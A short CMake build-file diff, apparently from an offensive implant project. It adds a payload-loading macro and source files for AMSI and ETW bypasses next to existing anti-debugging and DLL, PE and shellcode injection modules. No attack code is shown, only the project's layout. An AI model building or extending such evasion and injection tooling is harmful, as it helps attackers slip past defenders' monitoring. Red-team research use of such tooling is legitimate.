@@ -24,6 +24,7 @@ include_directories(include)
 
 # MACROS
 add_compile_definitions(PAYLOAD_TYPE=${PAYLOAD_TYPE})
+add_compile_definitions(PAYLOAD_TO_LOAD=${PAYLOAD_TO_LOAD})
 add_compile_definitions(PAYLOAD_TECHNIQUE=${PAYLOAD_TECHNIQUE})
 add_compile_definitions(PAYLOAD_PROCESS_TO_INJECT=${PAYLOAD_PROCESS_TO_INJECT})
 add_compile_definitions(LISTENER_PROTOCOL=${LISTENER_PROTOCOL})
@@ -63,7 +64,9 @@ set(SOURCE_CORE
         src/core/system/handle.cpp
         src/core/system/http.cpp
         src/core/system/process.cpp
+        src/core/technique/amsi_bypass.cpp
         src/core/technique/anti_debug.cpp
+        src/core/technique/etw_bypass.cpp
         src/core/technique/injection/dll_injection.cpp
         src/core/technique/injection/pe_injection.cpp
         src/core/technique/injection/shellcode_injection.cpp
